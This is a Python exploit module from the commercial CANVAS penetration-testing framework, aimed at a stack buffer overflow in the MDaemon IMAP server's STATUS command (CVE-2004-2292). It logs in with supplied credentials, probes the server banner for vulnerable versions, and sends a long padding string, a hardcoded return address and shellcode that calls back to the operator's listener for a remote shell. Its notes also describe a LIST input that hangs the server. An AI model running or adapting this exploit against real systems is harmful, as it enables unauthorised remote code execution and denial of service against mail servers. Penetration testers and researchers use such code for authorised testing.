#! /usr/bin/env python
"""
CANCRUSH

Mdaemon IMAP Status stack overflow

This is a remote system exploit, but requires a username and password
to log into the server

"""
NAME="mdaemon imap"
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

VERSION="1.0"

CHANGES="""

1.0

Found and exploited July 14, 2003 by Dave Aitel using SPIKE 2.9's IMAP
fuzzer

Buffer size appears to be 1024 (funny)

As a side note, a LIST command with %25n*5000 will put mdaemon in an
infinite loop. Not sure why - % is a special character, so perhaps
they just parse it poorly

Currently if you spawn calc.exe it actually pops up. This is probably
non-optimal. Need to set the hide flag.

"""


notes="""

"""

#http://www.immunityinc.com/CANVAS/
#Questions, comments: dave@immunityinc.com
#

import os,getopt
import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")



import socket
from exploitutils import *
import addencoder
import win32shell
import linuxshell
import time
from tcpexploit import tcpexploit
import urllib
import random

import httplib
import urllib

from libs.ctelnetlib import Telnet
import canvasengine

from shelllistener import shelllistener
from shelllistener import shellfromtelnet

#TODO: FIX THESE
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Alt-N"
DOCUMENTATION["Date public"]="05/17/2004"
DOCUMENTATION["CVE Name"] = "CVE-2004-2292"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2292"
DOCUMENTATION['CVSS'] = 5.0

DESCRIPTION="MDaemon Stack Overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000" ]

GTK2_DIALOG="dialog.glade2"


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.setPort(143)
        self.setHost("")
        self.setVersion(1)
        #see imaptest.py
        self.badstring="\x00\\/&.#%]-\r\n"
        self.geteipDict={}
        #jmp esp for MDaemon 6.8.2
        #msafd Win2K SP3
        #self.eipDict[1]=0x74fd2d67
        #SAMLIB Win2K SP3
        #self.eipDict[1]=0x7515366B
        #MCalender: .rdata
        self.geteipDict[0]=0x01812593
        return

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = self.gettcpsock()
        try:
            self.log("Testing for Mdaemon at %s:%d"%(self.host,self.port))
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return 0
        
        data=s.recv(500)
        self.log(data)
        if data.find("IMAP4rev1 MDaemon 6.8.2 ready")!=-1:
            self.setVersion(1)
            return 1
        if data.find("IMAP4rev1 MDaemon 6.8.4 ready")!=-1:
            self.setVersion(1)
            return 1
        
        return 0
          
    def createShellcode(self):
        localhost=self.callback.ip
        localport=self.callback.port
        if self.version in [0]:
            self.log( "Calling back to %s:%s"%(localhost,localport))
            return self.createWin32Shellcode(self.badstring,localhost,localport)
        else:
            self.log("Version not supported when creating shellcode!!!")
            return None
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def runAuto(self):
        if (self.test()):
            self.log("Using version %s"%self.version)
            self.run()
        else:
            self.log("Test reported not vulnerable")
        
    def run(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))

        try:
            self.user = self.argsDict["user"]
            self.password = self.argsDict["pass"]
        except:
            print "no user/pass set!"
            return 0

        debug=0
        if debug:
            a=330
            b=350
            stuff=prettyprint(self.shellcode[a:b])
            print "Shellcode[%d : %d]=%s"%(a,b,stuff)
            import sys
            #sys.exit(1)
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s = self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("Failed to connect.")
            return None
        line=s.recv(500)
        self.log("Banner returned %s"%line)
        self.log("Using username %s and password %s"%(self.user,self.password))
        s.send("0001 LOGIN \"%s\" \"%s\"\r\n"%(self.user,self.password))
        line=s.recv(500)
        self.log("Login returned %s"%line)
        body="0002 STATUS \""+self.makesploit()+"\" (a)\r\n"
        s.send(body)
        data=s.recv(500)
        self.log("Server returned: %s"%data)
        return None

    #returns the sploitstring
    def makesploit(self):
        geteip=self.geteipDict[self.version]

        data=""
        data+="A"*1026
        data+=intel_order(geteip)
        data+="A"*4
        #data+="\xcc"
        data+=self.shellcode
        return data


    def displayVersions(self):
        print "Versions: "
        print "\t1 - MDaemon 6.8.2"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    app.options = ["-O user:username", "-O pass:password"]
    ret=standard_callback_commandline(app)
    
